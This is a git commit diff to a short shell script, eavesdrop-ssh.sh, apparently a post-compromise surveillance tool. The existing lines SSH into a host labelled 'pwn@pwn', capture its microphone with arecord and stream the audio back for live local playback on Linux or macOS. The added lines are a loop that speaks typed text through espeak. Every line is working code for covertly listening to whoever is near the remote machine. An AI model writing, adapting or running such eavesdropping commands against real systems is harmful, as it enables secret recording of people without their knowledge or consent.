5c29dbb22b72bc20dbdd8dcd2ddf94fa80d848f8
Krystian Bajno <krystian.bajno@gmail.com>
2024-08-14 15:07:55 +0200

    Update eavesdrop-ssh.sh

--- eavesdrop-ssh.sh
+++ eavesdrop-ssh.sh
@@ -3,3 +3,6 @@ ssh -C pwn@pwn "arecord -f cd -" | aplay
 
 # local is MAC OS remote is LINUX:
 ssh -C pwn@pwn "arecord -f cd -" | play -t raw -b 16 -c 2 -e signed-integer -r 44100 -
+
+# talk
+while true; do read -p "Enter text to speak: " text; espeak -v "pl" -a 100 -s 60 "$text"; done
